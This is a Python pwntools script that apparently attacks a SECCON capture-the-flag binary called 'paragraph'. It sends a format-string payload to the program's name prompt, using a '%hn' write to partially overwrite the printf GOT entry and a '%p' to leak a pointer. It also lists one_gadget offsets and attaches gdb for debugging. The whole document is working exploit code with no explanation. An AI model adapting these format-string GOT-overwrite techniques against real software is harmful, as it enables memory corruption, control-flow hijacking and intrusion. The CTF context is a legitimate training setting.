#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./chall',checksec=False)
#p = remote('paragraph.seccon.games', 5000)
p = process()
gdb.attach(p,gdbscript='''     

        b*0x00000000004011fa

           ''')

one_gadget = [0x583dc,0x583e3,0xef4ce,0xef52b]
log.info(f"one_gadget {hex(one_gadget[3])}")

payload = b'%32256c%8$hn%1$p'
payload = payload.ljust(16,b'\x00')
payload += p64(exe.got.printf)[:-1]
print(len(payload))

input()
p.sendlineafter(b'"What is your name?", the black cat asked.\n', payload)


p.interactive()
